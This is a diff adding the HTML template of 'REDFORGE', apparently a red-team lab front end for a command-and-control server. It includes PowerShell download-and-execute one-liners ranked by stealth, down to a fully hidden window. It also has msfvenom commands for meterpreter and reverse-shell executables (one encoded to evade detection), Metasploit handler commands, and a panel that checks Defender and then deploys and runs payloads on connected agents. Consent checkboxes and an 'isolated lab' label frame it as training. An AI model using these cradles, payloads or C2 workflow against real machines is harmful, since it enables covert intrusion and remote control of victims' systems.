@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>REDFORGE | Red Team Simulation Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+<div class="app">
+
+  <header class="topbar">
+    <div class="brand"><span class="bolt">⚡</span>REDFORGE<small>red team simulation lab</small></div>
+    <div class="top-right">
+      <span class="hide-sm">UPTIME <b id="uptime">00:00:00</b></span>
+      <span class="hide-sm" id="clock">--:--:--</span>
+      <span class="status">LAB STATUS <span class="dot"></span> <b style="color:var(--green)">ONLINE</b></span>
+    </div>
+  </header>
+
+  <nav class="side" aria-label="Main navigation">
+    <div class="nav-group">
+      <div class="nav-title">DASHBOARD</div>
+      <button class="nav-item active" data-view="dashboard"><span class="ico">▣</span>Overview</button>
+      <button class="nav-item" data-view="agent"><span class="ico">⚡</span>PowerShell Agent</button>
+      <button class="nav-item" data-view="mitre"><span class="ico">▦</span>MITRE Matrix</button>
+      <button class="nav-item" data-view="recon"><span class="ico">🔎</span>Recon (nmap)</button>
+      <button class="nav-item" data-view="msfvenom"><span class="ico">⌘</span>msfvenom</button>
+      <button class="nav-item" data-view="terminal"><span class="ico">❯</span>MSF Console</button>
+      <button class="nav-item" data-view="targets"><span class="ico">🖥</span>Targets</button>
+    </div>
+    <div class="nav-spacer"></div>
+    <div class="nav-group">
+      <div class="nav-title">C2</div>
+      <button class="nav-item" data-view="c2"><span class="ico">📡</span>Connected Agents</button>
+      <button class="nav-item" data-view="settings"><span class="ico">⚙</span>Settings</button>
+    </div>
+    <div class="side-foot">
+      network <b>192.168.163.0/24</b><br>
+      mode <b>isolated lab</b>
+    </div>
+  </nav>
+
+  <main class="main">
+
+    <!-- ===== OVERVIEW ===== -->
+    <section class="view active" id="view-dashboard">
+      <div class="page-head">
+        <div>
+          <h1>RED TEAM SIMULATION<span class="cursor"></span></h1>
+          <p class="sub">Isolated lab environment. All targets are simulated.</p>
+        </div>
+        <span class="tag run" id="run-tag">● ACTIVE</span>
+      </div>
+
+      <div class="stats">
+        <div class="panel stat red"><div class="label">TARGETS</div><div class="value">04</div><div class="note">3 reachable, 1 offline</div></div>
+        <div class="panel stat"><div class="label">SESSIONS</div><div class="value" id="stat-sessions">00</div><div class="note">operator sessions</div></div>
+        <div class="panel stat amber"><div class="label">FINDINGS</div><div class="value" id="stat-findings">07</div><div class="note">2 high, 3 medium, 2 low</div></div>
+        <div class="panel stat green"><div class="label">DETECTIONS</div><div class="value" id="stat-detect">03</div><div class="note">blue team alerts raised</div></div>
+      </div>
+
+      <div class="grid-2">
+        <div class="stack">
+          <div class="panel hot">
+            <div class="panel-head"><span>ACTIVE SCENARIO</span><span class="dot red"></span></div>
+            <div class="panel-body">
+              <dl class="kv">
+                <dt>Name</dt><dd>Web Server Simulation</dd>
+                <dt>Target</dt><dd>192.168.163.136</dd>
+                <dt>Status</dt><dd><span class="tag run" id="scn-status">RUNNING</span></dd>
+                <dt>Objective</dt><dd>Assess exposure of a staged web tier</dd>
+                <dt>Operator</dt><dd>red-op-02</dd>
+                <dt>Elapsed</dt><dd id="elapsed">00:00:00</dd>
+              </dl>
+              <div class="btn-row">
+                <button class="btn primary" id="btn-toggle">Pause simulation</button>
+                <button class="btn" id="btn-reset">Restart</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="panel">
+            <div class="panel-head"><span>ATTACK SIMULATION</span><span id="phase-name" style="color:var(--red-hot)">Recon</span></div>
+            <div class="panel-body">
+              <div class="progress-top"><span style="color:var(--text-low)">progress</span><span class="pct" id="pct">12%</span></div>
+              <div class="bar" id="bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="12"></div>
+              <ul class="phases" id="phases"></ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-head"><span>LIVE EVENT STREAM</span><span style="color:var(--text-low)" id="evt-count">0 events</span></div>
+          <div class="term" id="term" role="log" aria-live="off"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== POWERSHELL AGENT ===== -->
+    <section class="view" id="view-agent">
+      <div class="page-head">
+        <div><h1>POWERSHELL AGENT</h1><p class="sub">Choose an OPSEC level, copy the one-liner, paste into Windows PowerShell. The VM appears as a connected agent.</p></div>
+      </div>
+
+      <div class="panel" style="margin-bottom:14px">
+        <div class="panel-head"><span>AGENT ONE-LINER — SELECT OPSEC LEVEL</span></div>
+        <div class="panel-body">
+          <div class="opsec-grid">
+
+            <div class="opsec-card low">
+              <div class="opsec-head"><span class="sev-badge sev-low">LOW</span><span>Visible PowerShell window</span></div>
+              <p class="opsec-desc">Foreground window. The user can see the process. Best for early testing / observing agent behaviour.</p>
+              <pre id="ol-low" class="code-block">powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"</pre>
+              <button class="btn primary" onclick="copyOneLiner('ol-low')">📋 Copy one-liner</button>
+            </div>
+
+            <div class="opsec-card medium">
+              <div class="opsec-head"><span class="sev-badge sev-medium">MEDIUM</span><span>Normal console window</span></div>
+              <p class="opsec-desc">Standard console window. Slightly less obtrusive than LOW, still visible to the user.</p>
+              <pre id="ol-med" class="code-block">powershell -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"</pre>
+              <button class="btn primary" onclick="copyOneLiner('ol-med')">📋 Copy one-liner</button>
+            </div>
+
+            <div class="opsec-card high">
+              <div class="opsec-head"><span class="sev-badge sev-high">HIGH</span><span>Minimized window</span></div>
+              <p class="opsec-desc">Console starts minimized. The user sees the process in the taskbar only.</p>
+              <pre id="ol-high" class="code-block">powershell -NoProfile -WindowStyle Minimized -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"</pre>
+              <button class="btn primary" onclick="copyOneLiner('ol-high')">📋 Copy one-liner</button>
+            </div>
+
+            <div class="opsec-card critical">
+              <div class="opsec-head"><span class="sev-badge sev-critical">CRITICAL</span><span>Hidden window (no UI)</span></div>
+              <p class="opsec-desc">Completely hidden. No window, no taskbar entry. Standard initial access style.</p>
+              <pre id="ol-crit" class="code-block">powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"</pre>
+              <button class="btn primary" onclick="copyOneLiner('ol-crit')">📋 Copy one-liner</button>
+            </div>
+
+          </div>
+
+          <div class="info-box">
+            <b>How to use:</b>
+            <ol>
+              <li>Click <b>📋 Copy one-liner</b> on the level you want.</li>
+              <li>On the target Windows VM, open <b>PowerShell</b> (Run as Administrator for full checks).</li>
+              <li>Paste the one-liner and press Enter.</li>
+              <li>Within ~8 seconds, the VM appears in <b>Connected Agents</b> with the computer name.</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== MITRE ===== -->
+    <section class="view" id="view-mitre">
+      <div class="page-head">
+        <div><h1>MITRE ATT&amp;CK MATRIX</h1><p class="sub">Coverage tracked live from your recon, msfvenom, and C2 actions.</p></div>
+        <button class="btn primary" id="btn-export-attack">Export JSON</button>
+      </div>
+      <div class="mitre-grid" id="mitre-grid"></div>
+    </section>
+
+    <!-- ===== RECON ===== -->
+    <section class="view" id="view-recon">
+      <div class="page-head">
+        <div><h1>RECON</h1><p class="sub">Type real nmap commands. Private (RFC1918) targets only.</p></div>
+      </div>
+      <div class="hint-bar" id="recon-hints">
+        <span class="hint-label">HINTS (click to use):</span>
+        <button class="hint" onclick="reconHint('nmap -sV -T4 --top-ports 100 192.168.163.136')">nmap -sV -T4 --top-ports 100 TARGET</button>
+        <button class="hint" onclick="reconHint('nmap -sV --version-all -p 443 192.168.163.136')">nmap -sV --version-all -p 443 TARGET</button>
+        <button class="hint" onclick="reconHint('nmap -sV --script http-headers,http-title -p 80,443 192.168.163.136')">nmap --script http-headers,http-title TARGET</button>
+        <button class="hint" onclick="reconHint('nmap -sn 192.168.163.0/24')">nmap -sn SUBNET</button>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><span>nmap terminal</span><span id="nmap-status" style="color:var(--text-low)">idle</span></div>
+        <pre class="terminal" id="nmap-term" style="height:520px"></pre>
+        <form class="terminal-input" id="nmap-form" autocomplete="off">
+          <span class="prompt">$</span>
+          <input type="text" id="nmap-cmd" placeholder="type an nmap command and press Enter">
+        </form>
+      </div>
+      <div class="checkbox-row" style="margin-top:12px">
+        <input type="checkbox" id="nmap-consent">
+        <label for="nmap-consent">I own the target or have written authorization to scan it.</label>
+      </div>
+    </section>
+
+    <!-- ===== MSFVENOM ===== -->
+    <section class="view" id="view-msfvenom">
+      <div class="page-head">
+        <div><h1>MSFVENOM</h1><p class="sub">Type real msfvenom commands. Files land in <code>generated_payloads/</code>.</p></div>
+        <span class="tag idle" id="tools-tag">checking tools...</span>
+      </div>
+      <div class="hint-bar" id="mf-hints">
+        <span class="hint-label">HINTS (click to use):</span>
+        <button class="hint" onclick="mfHint('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.163.135 LPORT=4444 -f exe -o lab_payload.exe')">windows/x64 meterpreter</button>
+        <button class="hint" onclick="mfHint('msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.163.135 LPORT=443 -f exe -o lab_payload_https.exe')">windows/x64 meterpreter https</button>
+        <button class="hint" onclick="mfHint('msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.135 LPORT=4444 -f exe -o lab_shell.exe')">windows/x64 plain shell</button>
+        <button class="hint" onclick="mfHint('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.163.135 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o lab_enc.exe')">meterpreter + encoding</button>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><span>msfvenom terminal</span><span id="mf-status" style="color:var(--text-low)">idle</span></div>
+        <pre class="terminal" id="mf-term" style="height:520px"></pre>
+        <form class="terminal-input" id="mf-form" autocomplete="off">
+          <span class="prompt">$</span>
+          <input type="text" id="mf-cmd" placeholder="type a msfvenom command and press Enter">
+        </form>
+      </div>
+      <div class="checkbox-row" style="margin-top:12px">
+        <input type="checkbox" id="mf-consent">
+        <label for="mf-consent">I confirm this is for an isolated lab VM I own or have written authorization to test.</label>
+      </div>
+    </section>
+
+    <!-- ===== MSF CONSOLE + DEPLOYER ===== -->
+    <section class="view" id="view-terminal">
+      <div class="page-head">
+        <div><h1>MSF CONSOLE</h1><p class="sub">Real msfconsole via PTY. You type every command — the tool only provides hints.</p></div>
+        <div class="btn-row" style="margin:0">
+          <button class="btn primary" id="btn-msf-start">▶ Start msfconsole</button>
+          <button class="btn" id="btn-msf-stop">⏹ Stop</button>
+          <span class="tag idle" id="msf-session-tag">no session</span>
+        </div>
+      </div>
+
+      <!-- HINTS -->
+      <div class="hint-bar">
+        <span class="hint-label">COMMON COMMANDS (type them yourself):</span>
+        <button class="hint" onclick="msfHint('use exploit/multi/handler')">use exploit/multi/handler</button>
+        <button class="hint" onclick="msfHint('set PAYLOAD windows/x64/meterpreter/reverse_tcp')">set PAYLOAD ...</button>
+        <button class="hint" onclick="msfHint('set LHOST 192.168.163.135')">set LHOST ...</button>
+        <button class="hint" onclick="msfHint('set LPORT 4444')">set LPORT ...</button>
+        <button class="hint" onclick="msfHint('exploit -j')">exploit -j</button>
+        <button class="hint" onclick="msfHint('sessions -l')">sessions -l</button>
+      </div>
+
+      <!-- DEPLOYER -->
+      <div class="panel" style="margin-bottom:14px">
+        <div class="panel-head"><span>DEPLOYER — send a payload to a target agent</span>
+          <span class="tag idle" id="deployer-status">idle</span>
+        </div>
+        <div class="panel-body">
+
+          <div class="grid-deploy">
+            <div>
+              <label>Target agent</label>
+              <select id="deployer-agent"><option value="">— select a connected agent —</option></select>
+            </div>
+
+            <div>
+              <label>Payload on this Kali machine</label>
+              <input type="text" id="deployer-path" placeholder="/home/kali/lab_payload.exe">
+            </div>
+
+            <div>
+              <label>Or pick from generated_payloads/</label>
+              <select id="deployer-select"><option value="">— none —</option></select>
+            </div>
+          </div>
+
+          <div class="checkbox-row">
+            <input type="checkbox" id="deployer-consent">
+            <label for="deployer-consent">I own the target agent's VM and have written authorization to run this payload.</label>
+          </div>
+
+          <div class="btn-row">
+            <button class="btn primary" id="btn-deployer-check">🛡 1. Check Defender on target</button>
+            <button class="btn primary" id="btn-deployer-run" disabled>🚀 2. Deploy + Execute</button>
+            <button class="btn" id="btn-deployer-refresh">↻ Refresh lists</button>
+          </div>
+
+          <pre class="terminal" id="deployer-out" style="height:200px;margin-top:12px">Waiting for step 1: click "Check Defender on target".</pre>
+        </div>
+      </div>
+
+      <!-- CONSOLE -->
+      <div class="panel">
+        <div class="panel-head"><span>msfconsole session</span><span id="msf-status" style="color:var(--text-low)">idle</span></div>
+        <pre class="terminal" id="msf-term" tabindex="0" style="height:460px"></pre>
+        <form class="terminal-input" id="msf-form" autocomplete="off">
+          <span class="prompt">msf6 &gt;</span>
+          <input type="text" id="msf-input" placeholder="type a command and press Enter" disabled>
+        </form>
+      </div>
+    </section>
+
+    <!-- ===== C2 CONNECTED AGENTS ===== -->
+    <section class="view" id="view-c2">
+      <div class="page-head">
+        <div><h1>CONNECTED AGENTS</h1><p class="sub">VMs that ran the PowerShell one-liner and connected back.</p></div>
+        <button class="btn" onclick="terminateAll()">⏻ Terminate All</button>
+      </div>
+
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-head"><span>AGENTS</span><span class="badge" id="agentCount">{{ agents|length }}</span></div>
+          <div class="panel-body">
+            <div id="agentList" class="agent-list">
+              {% for aid, info in agents.items() %}
+              <div class="agent-card" data-agent="{{ aid }}" onclick="selectAgent('{{ aid }}')">
+                <div class="agent-name">{{ info.hostname }}</div>
+                <div class="agent-meta">{{ info.user }}</div>
+                <div class="agent-status {{ info.status }}">{{ info.status }}</div>
+              </div>
+              {% endfor %}
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-head">
+            <span>ABILITIES</span>
+            <input type="text" id="abilitySearch" placeholder="search..." onkeyup="filterAbilities()" style="width:140px">
+          </div>
+          <div class="panel-body">
+            <div class="ability-grid" id="abilityGrid">
+              {% for tid, ab in abilities.items() %}
+              <div class="ability-card severity-{{ ab.severity }}" data-search="{{ tid }} {{ ab.name }} {{ ab.tactic }}">
+                <div class="ability-header">
+                  <span class="tech-id">{{ tid }}</span>
+                  <span class="sev-badge sev-{{ ab.severity }}">{{ ab.severity }}</span>
+                </div>
+                <div class="ability-name">{{ ab.name }}</div>
+                <div class="ability-tactic">{{ ab.tactic }}</div>
+                <button class="btn btn-run" onclick="queueAbility('{{ tid }}')">▶ Run</button>
+              </div>
+              {% endfor %}
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel" style="margin-top:14px">
+        <div class="panel-head"><span>RESULTS</span><button class="btn" onclick="clearResults()">Clear</button></div>
+        <div class="panel-body"><div id="resultsArea" class="results-area"></div></div>
+      </div>
+    </section>
+
+    <!-- ===== TARGETS ===== -->
+    <section class="view" id="view-targets">
+      <div class="page-head"><div><h1>TARGETS</h1><p class="sub">VMs registered in this lab.</p></div></div>
+      <div class="panel"><div class="table-wrap">
+        <table>
+          <thead><tr><th>NAME</th><th>ADDRESS</th><th>ROLE</th><th>STATUS</th><th>RISK</th></tr></thead>
+          <tbody>
+            <tr><td>win-vm-01</td><td>192.168.163.136</td><td>Windows workstation</td><td>online</td><td><span class="sev-high">high</span></td></tr>
+            <tr><td>web-srv-01</td><td>192.168.163.20</td><td>Web server</td><td>online</td><td><span class="sev-high">high</span></td></tr>
+            <tr><td>file-srv-01</td><td>192.168.163.10</td><td>File server</td><td>online</td><td><span class="sev-med">medium</span></td></tr>
+          </tbody>
+        </table>
+      </div></div>
+    </section>
+
+    <!-- ===== SETTINGS ===== -->
+    <section class="view" id="view-settings">
+      <div class="page-head"><div><h1>SETTINGS</h1><p class="sub">Lab configuration.</p></div></div>
+      <div class="panel"><div class="panel-body">
+        <dl class="kv">
+          <dt>Network mode</dt><dd>Isolated (no external routing)</dd>
+          <dt>Subnet</dt><dd>192.168.163.0/24</dd>
+          <dt>Safe mode</dt><dd><span class="tag ok">ENABLED</span></dd>
+        </dl>
+      </div></div>
+    </section>
+
+  </main>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script src="/static/app.js"></script>
+<script>
+  window.SERVER_IP = "{{ server_ip }}";
+</script>
+</body>
+</html>
